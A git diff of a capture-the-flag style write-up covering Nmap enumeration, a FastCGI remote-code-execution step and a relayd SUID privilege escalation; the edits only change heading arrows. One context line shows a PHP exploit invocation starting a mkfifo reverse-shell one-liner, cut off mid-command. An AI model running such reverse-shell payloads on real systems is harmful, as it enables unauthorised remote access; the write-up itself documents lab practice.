@@ -32,7 +32,7 @@ Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 22:31 +08
 
 Port 8000 was running Pico CMS, which does have some exploits.&#x20;
 
-### Web Enum --> PHPInfo
+### Web Enum -> PHPInfo
 
 Port 80 had a countdown:
 
@@ -103,7 +103,7 @@ Here, we can find that `/var/www/html/planetexpress` is the document root. Also,
 
 <figure><img src="../../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>
 
-### FastCGI --> RCE
+### FastCGI -> RCE
 
 There wasn't much else on the webpage for us to test, however there was still port 9000. Googling it revealed that it was running FastCGI:
 
@@ -127,7 +127,7 @@ $ python2 exploit.py -c '<?php passthru("bash -c \"rm /tmp/f;mkfifo /tmp/f;cat /
 
 ## Privilege Escalation
 
-### Relayd SUID --> Shadw Hash
+### Relayd SUID -> Shadw Hash
 
 I searched for SUID binaries and found one that stood out:
 
